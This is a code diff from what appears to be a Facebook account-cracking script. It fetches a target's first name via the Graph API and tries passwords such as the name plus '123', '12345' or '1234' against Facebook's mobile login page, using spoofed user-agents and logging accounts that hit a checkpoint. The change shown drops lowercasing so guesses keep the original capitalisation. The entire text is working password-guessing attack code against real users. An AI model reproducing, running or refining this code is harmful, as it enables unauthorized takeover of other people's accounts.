@@ -351,7 +351,7 @@ def pilih_indo():
 		try:
 			an = requests.get('https://graph.facebook.com/'+em+'/?access_token='+toket)
 			v = json.loads(an.text)
-			pw = v['first_name'].lower()+'123'
+			pw = v['first_name']+'123'
 			rex = requests.post("https://mbasic.facebook.com/login.php", data = {"email" : em, "pass" : pw, "login" : "submit"}, headers = { "user-agent" : "Mozilla/5.0 (Linux; U; Android 2.2) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1"})
 			xo = rex.content
 			if 'mbasic_logout_button' in xo or 'save-device' in xo:
@@ -368,7 +368,7 @@ def pilih_indo():
 					cek.close()
 					cekpoint.append(em)
 				else:
-					pw2 = v['first_name'].lower()+'12345'
+					pw2 = v['first_name']+'12345'
 					rex = requests.post("https://mbasic.facebook.com/login.php", data = {"email" : em, "pass" : pw2, "login" : "submit"}, headers = {"user-agent" : "Mozilla/5.0 (Linux; Android 7.1.2; AFTMM Build/NS6265; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/70.0.3538.110 Mobile Safari/537.36"})
 					xo = rex.content
 					if 'mbasic_logout_button' in xo or 'save-device' in xo:
@@ -385,7 +385,7 @@ def pilih_indo():
 							cek.close()
 							cekpoint.append(em)
 						else:
-							pw3 = v['first_name'].lower()+'1234'
+							pw3 = v['first_name']+'1234'
 							rex = requests.post("https://mbasic.facebook.com/login.php", data = {"email" : em, "pass" : pw3, "login" : "submit"}, headers = {"user-agent" : "Mozilla/5.0 (Linux; Android 6.0.1; SM-G532G Build/MMB29T) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.83 Mobile Safari/537.36"})
 							xo = rex.content
 							if 'mbasic_logout_button' in xo or 'save-device' in xo:
